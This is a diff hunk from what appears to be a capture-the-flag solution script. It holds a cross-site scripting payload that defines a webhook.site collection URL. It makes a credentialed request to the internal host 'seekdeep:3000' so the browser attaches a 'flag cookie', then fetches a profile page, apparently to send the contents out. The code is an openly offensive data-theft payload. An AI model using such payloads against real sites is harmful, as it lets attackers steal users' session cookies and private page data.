@@ -14,7 +14,7 @@ const WEBHOOK = "https://webhook.site/1f9b4f19-2450-4597-88a2-f1f2a4440af4";
   try {
     /* 1⃣  Make *any* same‑origin request first.  This guarantees the browser
            attaches the flag cookie to subsequent requests. */
-    await fetch("/", { credentials: "include" });
+    await fetch("http://seekdeep:3000/", { credentials: "include" });
 
     /* 2⃣  Pull something that is sure to be readable (HTML, JSON, whatever).
            `/profile` is just an example; pick a page that exists. */
